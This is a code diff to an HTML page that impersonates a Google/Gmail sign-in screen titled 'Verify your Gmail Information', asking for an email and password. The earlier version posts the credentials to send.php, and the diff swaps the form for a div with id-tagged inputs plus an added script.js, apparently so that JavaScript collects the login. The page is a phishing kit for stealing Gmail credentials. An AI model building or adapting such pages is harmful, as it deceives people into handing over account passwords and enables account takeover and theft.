@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Google Account</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js" integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8=" crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
 </head>
 <body>
     <div class="login-container">
@@ -20,14 +20,14 @@
             <h2>𝗦𝗶𝗴𝗻 𝗶𝗻</h2>
             <h3> Verify your Gmail Information</h3>
             <p>to continue to Gmail</p>
-            <form action="send.php" method="post">
+            <div">
                 <div class="input-container">
-                    <input type="email" name="username" placeholder="Email or phone" required>
+                    <input type="email" id="username" placeholder="Email or phone" required>
                 </div>
                 <div class="forgot-email">
                 </div>
                 <div class="input-container">
-                    <input type="password" name="password" placeholder="Enter your password" required>
+                    <input type="password" id="password" placeholder="Enter your password" required>
                 </div>
                 <div class="forgot-password">
                 </div>
@@ -37,8 +37,9 @@
                 <div class="create-account">
                     <a href="#">Create account</a>
                 </div>
-            </form>
+            </div>
         </div>
     </div>
+    <script src="./script.js"></script>
 </body>
 </html>
